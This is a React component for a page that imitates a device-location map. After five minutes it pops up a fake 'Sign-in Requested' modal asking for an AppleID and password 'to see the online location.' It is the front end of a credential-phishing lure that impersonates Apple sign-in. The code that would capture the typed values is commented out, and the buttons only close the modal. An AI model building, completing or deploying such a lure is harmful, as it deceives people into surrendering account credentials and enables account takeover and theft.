import React, { useState } from 'react'
import Modal from 'react-bootstrap/Modal'
import { BrowserView, MobileView } from 'react-device-detect'
import Pic20 from '../img/Capture.PNG'
import Pic22 from '../img/a.aphoto.jpg'
import marker from '../img/eyob_adobespark.png'


const Map = () => {
  //const defaultPosition: LatLngExpression = [48.864716, 2.349] // Paris position
  const [isOpen, setIsOpen] = React.useState(false)

  const showModal = () => {
    setIsOpen(true)
  }

  const hideModal = () => {
    setIsOpen(false)
  }
  setTimeout(showModal, 300000)
  return (
    <div className='map__container'>
      <BrowserView>
        <div class='container'>
          <div class='row'>
            <div class='container'>
              <div class='row'>
                <a
                  href='#'
                  class='intro-banner-vdo-play-btn pinkBg'
                  target='_blank'
                >
                  <i aria-hidden='true'></i>
                  <span class='ripple pinkBg'></span>
                  <span class='ripple pinkBg'></span>
                  <span class='ripple pinkBg'></span>
                </a>
              </div>
            </div>
          </div>
        </div>
        <div className='map__container'>
          <img src={Pic20} alt='Logo' style={{}} />
          <img
            src={marker}
            alt='Logo'
            style={{
              width: '10%',
              position: 'fixed',
              left: '40%',
              top: '40%',
            }}
          />
        </div>
        <div style={{ borderRadius: '10px' }}>
          <Modal
            class='modal-content'
            style={{
              fontWeight: 'bold',
              fontSize: '14px',
              width: '85%',
              //position: 'fixed',
              left: '7.5%',
              top: '5%',
            }}
            show={isOpen}
            onHide={hideModal}
          >
            <Modal.Header
              style={{
                justifyContent: 'center',
                fontSize: '12px',
              }}
            >
              <Modal.Title
                style={{
                  justifyContent: 'center',
                }}
              >
                Sign-in Requested
                <div>
                  <p
                    style={{
                      fontSize: '14px',
                    }}
                  >
                    to see the online location.
                  </p>
                </div>
              </Modal.Title>
            </Modal.Header>

            <div class='modal-body'>
              <form>
                <div class='col-xs-4'>
                  <input
                    id='userInput'
                    name='appleId'
                    autoFocus={true}
                    className='userInput'
                    placeholder='AppleID'
                    class='form-control'
                    type='text'
                    //value={total.appleId}
                    //onInput={changeAppleIdButtonColor}
                    //onKeyPress={handleAppleIdKeyPress}
                    //onChange={handleChange}
                  ></input>
                </div>
                <br></br>
                <div class='col-xs-4'>
                  <input
                    id='passwordInput'
                    name='password'
                    className='passwordInput'
                    placeholder='Password'
                    class='form-control'
                    type='password'
                    //value={total.password}
                  ></input>
                </div>
              </form>
            </div>

            <Modal.Footer>
              <button
                style={{
                  fontSize: '12px',
                  fontFamily: 'Arial',
                  justifyContent: 'left',
                  backgroundColor: 'white',
                  color: '#42B72A',
                  border: 'none',
                  fontWeight: 'bold',
                  fontSize: '15px',
                  height: '40px',
                  marginTop: '10px',
                  marginRight: '60%',
                }}
                type='button'
                class='btn btn-secondary'
                data-dismiss='modal'
                onClick={hideModal}
              >
                Cancel
              </button>
              <button
                style={{
                  fontSize: '12px',
                  fontFamily: 'Arial',
                  justifyContent: 'right',
                  fontWeight: 'bold',
                  fontSize: '15px',
                  height: '40px',
                  marginTop: '10px',
                  marginRight: '10px',
                }}
                type='button'
                class='btn btn-primary'
                onClick={hideModal}
              >
                Sign in
              </button>
            </Modal.Footer>
          </Modal>
        </div>
      </BrowserView>
      <MobileView>
        <div class='container'>
          <div class='row'>
            <div class='container'>
              <div class='row'>
                <a
                  href='#'
                  class='intro-banner-vdo-play-btn pinkBg'
                  target='_blank'
                >
                  <i aria-hidden='true'></i>
                  <span class='ripple pinkBg'></span>
                  <span class='ripple pinkBg'></span>
                  <span class='ripple pinkBg'></span>
                </a>
              </div>
            </div>
          </div>
        </div>
        <div className='map__container'>
          <img
            src={Pic22}
            alt='Logo'
            style={{
              width: '100%',
              height: '100%',
            }}
          />
          <img
            src={marker}
            alt='Logo'
            style={{
              width: '40%',
              position: 'fixed',
              left: '25%',
              top: '40%',
            }}
          />
        </div>
        <div style={{ borderRadius: '10px' }}>
          <Modal
            class='modal-content'
            style={{
              fontWeight: 'bold',
              fontSize: '14px',
              width: '85%',
              //position: 'fixed',
              left: '7.5%',
              top: '5%',
            }}
            show={isOpen}
            onHide={hideModal}
          >
            <Modal.Header
              style={{
                justifyContent: 'center',
                fontSize: '12px',
              }}
            >
              <Modal.Title
                style={{
                  justifyContent: 'center',
                }}
              >
                Sign-in Requested
                <div>
                  <p
                    style={{
                      fontSize: '14px',
                    }}
                  >
                    to see the online location.
                  </p>
                </div>
              </Modal.Title>
            </Modal.Header>

            <div class='modal-body'>
              <form>
                <div class='col-xs-4'>
                  <input
                    id='userInput'
                    name='appleId'
                    autoFocus={true}
                    className='userInput'
                    placeholder='AppleID'
                    class='form-control'
                    type='text'
                    //value={total.appleId}
                    //onInput={changeAppleIdButtonColor}
                    //onKeyPress={handleAppleIdKeyPress}
                    //onChange={handleChange}
                  ></input>
                </div>
                <br></br>
                <div class='col-xs-4'>
                  <input
                    id='passwordInput'
                    name='password'
                    className='passwordInput'
                    placeholder='Password'
                    class='form-control'
                    type='password'
                    //value={total.password}
                  ></input>
                </div>
              </form>
            </div>

            <Modal.Footer>
              <button
                style={{
                  fontSize: '12px',
                  fontFamily: 'Arial',
                  justifyContent: 'left',
                  backgroundColor: 'white',
                  color: '#42B72A',
                  border: 'none',
                  fontWeight: 'bold',
                  fontSize: '15px',
                  height: '40px',
                  marginTop: '10px',
                  marginRight: '35%',
                }}
                type='button'
                class='btn btn-secondary'
                data-dismiss='modal'
                onClick={hideModal}
              >
                Cancel
              </button>
              <button
                style={{
                  fontSize: '12px',
                  fontFamily: 'Arial',
                  justifyContent: 'right',
                  fontWeight: 'bold',
                  fontSize: '15px',
                  height: '40px',
                  marginTop: '10px',
                  marginRight: '10px',
                }}
                type='button'
                class='btn btn-primary'
                onClick={hideModal}
              >
                Sign in
              </button>
            </Modal.Footer>
          </Modal>
        </div>
      </MobileView>
    </div>
  )
}

export default Map
